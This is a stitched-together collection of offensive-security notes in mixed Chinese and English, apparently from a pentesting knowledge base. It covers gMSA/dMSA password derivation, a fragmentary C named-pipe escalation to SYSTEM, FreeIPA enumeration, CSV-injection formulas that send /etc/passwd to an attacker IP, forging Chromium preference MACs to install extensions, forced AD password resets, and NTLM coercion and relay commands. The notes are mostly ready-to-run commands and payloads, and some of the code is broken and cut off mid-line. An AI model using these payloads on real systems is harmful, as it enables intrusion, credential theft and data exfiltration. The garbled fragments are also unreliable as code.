1GoldendMSA.exe wordlist -s <SID> -d example.local -f example.local -k <KDSKeyGUID> # 5. Phase 1 – Extract the KDS Root Key 123# derive base64 passwordGoldendMSA.exe compute -s <SID> -k <KDSRootKey> -d example.local -m <ManagedPasswordID> -i <KDSRootKey ID>GoldenGMSA.exe compute --sid <SID> --kdskey <KDSRootKey> --pwdid <ManagedPasswordID> # 工具与参考入口 GoldenDMSA Semperis/GoldenGMSA mimikatz Rubeus Golden dMSA – 认证 绕过 for delegated Managed Service Accounts gMSA Active Directory 域 Attacks Accounts Improsec – Golden gMSA trust attack # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 是否准备回滚 / 清理步骤 # 关联 域与 Windows 总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

From High Integrity to SYSTEM with Name Pipes 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104#include <windows.h>#include <time.h>#pragma comment (lib, "advapi32")#pragma comment (lib, "kernel32")#define PIPESRV "PiperSrv"#define MESSAGE_SIZE 512int ServiceGo(void) { SC_HANDLE scManager; SC_HANDLE scService; scManager = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS); if (scManager == NULL) { return FALSE; } // create Piper service scService = CreateServiceA(scManager, PIPESRV, PIPESRV, SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS, SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL, "C:\\Windows\\\System32\\cmd.exe /rpowershell.exe -EncodedCommand ", NULL, NULL, NULL, NULL, NULL); if (scService == NULL) { //printf("[!] CreateServiceA() failed: [%d]\n", GetLastError()); return FALSE; } // launch it StartService(scService, 0, NULL); // wait a bit and then cleanup Sleep(10000); DeleteService(scService); CloseServiceHandle(scService); CloseServiceHandle(scManager);}int main() { LPCSTR sPipeName = "\\\\.\\pipe\\piper"; HANDLE hSrvPipe; HANDLE th; BOOL bPipeConn; char pPipeBuf[MESSAGE_SIZE]; DWORD dBRead = 0; // create and run service th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ServiceGo, NULL, 0, 0); // wait for the connection from the service bPipeConn = ConnectNamedPipe(hSrvPipe, NULL); if (bPipeConn) { ReadFile(hSrvPipe, &pPipeBuf, MESSAGE_SIZE, &dBRead, NULL); si.cb = sizeof(si); ZeroMemory(&pi, sizeof(pi)); if (!CreateProcessWithTokenW(hNewToken, LOGON_NETCREDENTIALS_ONLY, L"cmd.exe", NULL, NULL, NULL, NULL, (LPSTARTUPINFOW)&si, &pi)) { return -5; } // revert back to original security context RevertToSelf(); This includes KDCs and admin servers' locations, default settings, and mappings. Various environment variables (KRB5CCNAME, KRB5 KTNAME, KRB5 CONFIG, KRB5 KDC PROFILE, KRB5RCACHETYPE, KRB5RCACHEDIR, KRB5 TRACE, KRB5 CLIENT KTNAME, KPROP PORT) are used to point to specific files and settings relevant to Kerberos 认证. 工具 such as ipa, kdestroy, kinit, klist, kpasswd, ksu, kswitch, and kvno are key to managing FreeIPA domains, handling Kerberos tickets, changing passwords, and acquiring service tickets, among other functionalities. 认证 in FreeIPA, leveraging Kerberos, mirrors that in Active Directory 域. Access to domain resources necessitates a valid Kerberos ticket, which can be stored in various locations depending on FreeIPA domain configuration. You can find more information about how to use tickets in linux in the following link: privilege-escalation/linux-active-directory.md The 密码 哈希 of a user is stored as base64 in the “userPassword” attribute. This 哈希 might be SSHA512 (old versions of FreeIPA) or PBKDF2 SHA256. The Nthash of the 密码 store as base64 in “ipaNTHash” if system has integration with AD. # 命令 / 载荷 / 操作片段 # 1. Hosts, Users, and Groups <a href="#id-4b3b" id="id-4b3b"></a> 1234567891011ipa user-findipa usergroup-findipa host-findipa host-group-find-------------------ipa user-show <username> --allipa usergroup-show <user group> --allipa host-find <host> --allipa hostgroup-show <host group> --all # 4. HBAC-Rules <a href="#id-482b" id="id-482b"></a> 123456# Enumerate using ldapldapsearch -Y gssapi -b "cn=hbac,dc=domain_name,dc=local"# Using ipaipa hbacrule-find# Show info of ruleipa hbacrule-show <hbacrule> --all # 5. Sudo-Rules 123456# Enumerate using ldapldapsearch -Y gssapi -b "cn=sudorules,cn=sudo,dc=domain_name,dc=local"# Using ipaipa sudorule-find# Show info of ruleipa sudorule-show <sudorule> --all # 6. Role-Based Access Control 123456789# Using ldapldapsearch -Y gssapi -b "cn=roles,cn=accounts,dc=westeros,dc=local"# Using ipa binaryipa role-findipa role-show <role> --allipa privilege-findipa privilege-show <privilege> --allipa permission-findipa permission-show <permission> --all # 工具与参考入口 https://github.com/Orange-Cyberdefense/LinikatzV2 https://github.com/CiscoCXSecurity/linikatz https://posts.specterops.io/attacking-freeipa-part-i - 认证 - 77e73d837d6a https://posts.specterops.io/attacking-freeipa-part-ii - 枚举 - ad27224371e1 https://www.youtube.com/watch?v=9dOu-7BTwPQ # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 是否准备回滚 / 清理步骤 # 关联 域与 Windows 总览 知识地图 Kerberos 票据攻击 Linux 原生工具利用 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

Therefore, special effort on Social Engineering must be applied to he final 载荷. The following example was taken from https://payatu.com/csv-injection-basic-to - 利用 Injection of Malicious 载荷: The attacker submits a student detail form but includes a formula commonly used in spreadsheets (e.g., =HYPERLINK("<malicious link>","Click here")). This formula is designed to create a hyperlink, but it points to a malicious server controlled by the attacker. The CSV file, when opened, still contains the malicious 载荷. This 载荷 appears as a clickable hyperlink in the spreadsheet. Upon clicking, sensitive data (potentially including details from the spreadsheet or the teacher's computer) is transmitted to the attacker's server. The attacker's server receives and logs the sensitive data sent from the teacher's computer. The attacker can then use this data for various malicious purposes, further compromising the privacy and security of the students and the institution. Reading the first line from the local /etc/passwd file: ='file:///etc/passwd'#$passwd.A1 Exfiltrating the read data to an attacker-controlled server: =WEBSERVICE(CONCATENATE("http://<attacker IP>:8080/",('file:///etc/passwd'#$passwd.A1))) Exfiltrating more than one line: =WEBSERVICE(CONCATENATE("http://<attacker IP>:8080/",('file:///etc/passwd'#passwd.A1)&CHAR(36)&('file:///etc/passwd'#passwd.A2))) DNS exfiltration (sending read data as DNS queries to an attacker-controlled DNS server): =WEBSERVICE(CONCATENATE((SUBSTITUTE(MID((ENCODEURL('file:///etc/passwd'#$passwd.A19)),1,41),"%","-")),".<attacker domain>")) IMPORTXML: Imports data from structured data types：=IMPORTXML(CONCAT("http://<attacker IP:Port>/123.txt?v=", CONCATENATE(A2:E2)), "//a/a10") # 命令 / 载荷 / 操作片段 # 1. Read single lined file 12345

If you compute valid MACs with the browser’s embedded seed and write them next to your injected nodes, the browser accepts and activates your extension entry. Write the values under: Write the crafted nodes and MACs into the target profile’s Preferences/Secure Preferences; next launch will auto‑activate your extension with full declared privileges Whitelisted extension 哈希 spoofing (ID spoofing) Register the entry in Preferences and sign the MACs → ExtensionInstallAllowlist checks that match on ID only are bypassed ../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-chromium-injection.md # 命令 / 载荷 / 操作片段 # 1. Where extension state lives (Windows) 1234567891011121314151617181920212223242526{ "extensions": { "settings": { "<extension_id>": { "name": "Extension name", "manifest_version": 3, "version": "1.0", "key": "<BASE64 DER SPKI>", "path": "<absolute path if unpacked>", "state": 1, "from_bookmark": false, "was_installed_by_default": false // ...rest of manifest.json + required install metadata } }, "ui": { "developer_mode": true } }, "protection": { "macs": { "extensions": { "settings": { "<extension_id>": "<MAC>" }, "ui": { "developer_mode": "<MAC>" } } } }} # 2. Extension IDs: path vs key and making them deterministic 1234567891011121314151617181920212223import base64import hashlibfrom cryptography.hazmat.primitives import serializationfrom cryptography.hazmat.primitives.asymmetric import rsadef translate_crx_id(s: str) -> str: t = {'0':'a','1':'b','2':'c','3':'d','4':'e','5':'f','6':'g','7':'h','8':'i','9':'j','a':'k','b':'l','c':'m','d':'n','e':'o','f':'p'} return ''.join(t.get(c, c) for c in s)def generate_extension_keys() -> tuple[str,str,str]: priv = rsa.generate_private_key(public_exponent=65537, key_size=2048) pub = priv.public_key() spki = pub.public_bytes(encoding=serialization.Encoding.DER, format=serialization.PublicFormat.SubjectPublicKeyInfo) crx_id = translate_crx_id(hashlib.sha256(spki).digest()[:16].hex()) pub_b64 = base64.b64encode(spki).decode('utf-8') priv_der = priv.private_bytes(encoding=serialization.Encoding.DER, format=serialization.PrivateFormat.TraditionalOpenSSL, encryption_algorithm=serialization.NoEncryption()) priv_b64 = base64.b64encode(priv_der).decode('utf-8') return crx_id, pub_b64, priv_b64print(generate_extension_keys()) # 3. Extension IDs: path vs key and making them deterministic 123456{ "manifest_version": 3, "name": "Synacktiv extension", "version": "1.0", "key": "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA2lMCg6..."} # 4. Forging Preferences integrity MACs (core 绕过) 12345python3 pak_util.py extract resources.pak -o resources_v139/python3 pak_util.py extract resources.pak -o resources_v139_dirty/# compare a clean vs minimally modified

content: 来源路径： 02-知识点/域与Windows/ForceChangePassword 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # ForceChangePassword 技术笔记 [!summary] 提炼定位 面向 域与 Windows 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 在 Windows/AD 环境中围绕 ForceChangePassword 技术笔记 做枚举、凭据利用、横向或持久化分析。 优先确认身份、票据、权限边界和日志痕迹。 # 中文提炼 核心目标是把 ForceChangePassword 技术笔记 放进 AD/Windows 身份链：当前身份、凭据形态、目标对象和可达权限。 优先关注：ForceChangePassword；LDAP/SMB/Kerberos/ 证书 / ACL 的结果要能回写到攻击图谱。 每一步都区分枚举、离线验证、远程执行、对象修改和凭据使用，避免把低风险查询误当成利用。 检测视角重点记录登录事件、票据请求、进程链、远程服务、对象属性变更和网络目的地。 本页已沉淀 5 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 ForceChangePassword # 核心要点 This abuse can be carried out when controlling an object that has a GenericAll, AllExtendedRights or User-Force-Change - 密码 over the target user. It can also be achieved from UNIX-like system with net, a tool for the administration of samba and cifs/smb clients. The pth-toolkit can also be used to run net commands with 哈希传递. The attacker can change the 密码 of the user. This can be achieved with Set-DomainUserPassword (PowerView module). Mimikatz's lsadump::setntlm can also be used for that purpose. Also, the Invoke-PassTheCert fork can be used, authenticating through Schannel via PassTheCert (PowerShell version). Note: the README contains the 方法论 to request a certificate using certreq from Windows (with a 密码，or an NTHash). # 命令 / 载荷 / 操作片段 # 1. ForceChangePassword 12345678# With net and cleartext credentials (will be prompted)net rpc password "$TargetUser" -U "$DOMAIN"/"$USER" -S "$DC_HOST"# With net and cleartext credentialsnet rpc password "$TargetUser" -U "$DOMAIN"/"$USER"%"$PASSWORD" -S "$DC_HOST"# With Pass-the-Hashpth-net rpc password "$TargetUser" -U "$DOMAIN"/"$USER"%"ffffffffffffffffffffffffffffffff":"$NT_HASH" -S "$DC_HOST" # 2. ForceChangePassword 12rpcclient -U $DOMAIN/$ControlledUser $DomainControllerrpcclient $> setuserinfo2 $TargetUser 23 $NewPassword # 3. ForceChangePassword 1bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set password "$TargetUser" "$NewPassword" # 4. ForceChangePassword 12$NewPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -ForceSet-DomainUserPassword -Identity 'TargetUser' -AccountPassword $NewPassword # 5. ForceChangePassword 12345678910111213# Import the PowerShell script and show its manualImport-Module .\Invoke-PassTheCert.ps1.\Invoke-PassTheCert.ps1 -?# Authenticate to LDAP/S$LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server 'LDAP_IP' -Port 636 -Certificate cert.pfx# List all the available actionsInvoke-PassTheCert -a -NoBanner# Updates the password of account 'Wordy WP. PRESS' to an empty stringInvoke-PassTheCert -Action 'UpdatePasswordOfIdentity' -LdapConnection $LdapConnection -Identity 'CN=Wordy WP. PRESS,CN=Users,DC=X' -NewPassword ''# Updates the password of account 'Wordy WP. PRESS' to: NewP@ssw0rd123!Invoke-PassTheCert -Action 'UpdatePasswordOfIdentity' -LdapConnection $LdapConnection -Identity 'CN=Wordy WP. PRESS,CN=Users,DC=X' -NewPassword 'NewP@ssw0rd123!' # 工具与参考入口 net pth-toolkit rpcclient bloodyAD Set-DomainUserPassword PowerView lsadump::setntlm Invoke-PassTheCert PassTheCert README certreq # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 是否准备回滚 / 清理步骤 # 关联 域与 Windows 总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

title: Force NTLM Privileged 认证
content: 来源路径： 02-知识点/域与Windows/Force NTLM Privileged 认证.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # Force NTLM Privileged 认证 [!summary] 提炼定位 面向 域与 Windows 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 在 Windows/AD 环境中围绕 Force NTLM Privileged 认证 做枚举、凭据利用、横向或持久化分析。 优先确认身份、票据、权限边界和日志痕迹。 # 中文提炼 核心目标是把 Force NTLM Privileged 认证 放进 AD/Windows 身份链：当前身份、凭据形态、目标对象和可达权限。 优先关注：SharpSystemTriggers、Spooler Service Abuse、Finding Windows Servers on the domain、Finding Spooler services listening、Ask the service to authenticate against an arbitrary host；LDAP/SMB/Kerberos/ 证书 / ACL 的结果要能回写到攻击图谱。 每一步都区分枚举、离线验证、远程执行、对象修改和凭据使用，避免把低风险查询误当成利用。 检测视角重点记录登录事件、票据请求、进程链、远程服务、对象属性变更和网络目的地。 本页已沉淀 14 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 SharpSystemTriggers Spooler Service Abuse Finding Windows Servers on the domain Finding Spooler services listening Ask the service to authenticate against an arbitrary host Forcing HTTP instead of SMB with WebClient Combining with 非约束委派 RPC Force 认证 RPC UNC-path coercion matrix (interfaces/opnums that trigger outbound auth) MS-EVEN: ElfrOpenBELW (opnum 9) coercion PrivExchange Inside Windows Defender MpCmdRun MSSQL Certutil HTML injection Via email MitM # 核心要点 If the Print Spooler service is enabled, you can use some already known AD 凭据 to request to the Domain Controller’s print server an update on new print jobs and just tell it to send the notification to some system.\ Using PowerShell, get a list of Windows boxes. Servers are usually priority, so lets focus there: Using a slightly modified @mysmartlogin's (Vincent Le Toux's) SpoolerScanner, see if the Spooler Service is listening: If you want to enumerate coercion surfaces instead of just checking whether the spooler endpoint exists, use Coercer scan mode: This is useful because seeing the endpoint in EPM only tells you that the print RPC interface is registered. It does not guarantee that every coercion method is reachable with your current privileges or that the host will emit a usable 认证 flow. Classic PrinterBug usually yields an SMB 认证 to \attacker\share, which is still useful for capture, relay to HTTP targets or relay where SMB signing is absent.\ Notes: asynchronous print interface on the same spooler pipe; use Coercer to enumerate reachable methods on a given host Call signature: ElfrOpenBELW(UNCServerName, BackupFileName="\\attacker\share\backup.evt", MajorVersion=1, MinorVersion=1, LogHandle) Effect: the target attempts to open the supplied backup log path and authenticates to the attacker-controlled UNC. Practical use: coerce Tier 0 assets (DC/RODC/Citrix/etc.) to emit NetNTLM, then relay to AD CS endpoints (ESC8/ESC11 scenarios) or other privileged services. # 命令 / 载荷 / 操作片段 # 1. Finding Windows Servers on the domain 1Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt # 2. Finding Spooler services listening 12. .\Get-SpoolStatus.ps1ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server} # 3. Finding Spooler services listening 1rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN # 4. Finding Spooler services listening 1nxc smb targets.txt -u user -p password -M spooler # 5. Finding Spooler services listening 12coercer scan -u user -p password -d domain -t TARGET --filter-protocol-name MS-RPRNcoercer scan -u user -p password -d domain -t TARGET --filter-pipe-name spoolss # 6. Ask the service to authenticate against an arbitrary host 1SpoolSample.exe <TARGET> <RESPONDERIP> # 7. Ask the service to authenticate against an arbitrary host 12python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP> # 8. Ask the service to authenticate against an arbitrary host 12coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-protocol-name MS-RPRNcoercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-method-name RpcRemoteFindFirstPrinterChangeNotificationEx # 9. Forcing HTTP instead of SMB with WebClient 12printerbug.py 'domain/username:password'@TARGET 'ATTACKER@80/share'coercer coerce -u user -p password -d domain -t TARGET -l ATTACKER --http-port 80 --filter-protocol-name MS-RPRN # 10. Defender MpCmdRun 1C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt # 11. MSSQL 1EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1 # 12. MSSQL 12345678# Issuing NTLM relay attack on the SRV01 servermssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-290841
